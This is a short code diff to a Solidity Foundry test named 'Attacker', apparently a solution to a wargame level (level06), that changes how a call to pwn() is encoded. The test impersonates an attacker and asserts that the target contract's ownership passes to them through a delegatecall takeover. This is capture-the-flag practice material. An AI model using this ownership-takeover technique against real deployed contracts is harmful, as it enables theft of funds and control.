@@ -10,7 +10,7 @@ contract Attacker is Test {
 
     function test() external {
         vm.prank(attacker);
-        (bool success,) = address(level06).call(abi.encodeWithSignature("pwn()"));
+        (bool success,) = address(level06).call(abi.encodeCall(Delegate.pwn, ()));
 
         assert(success);
         assertEq(level06.owner(), attacker);
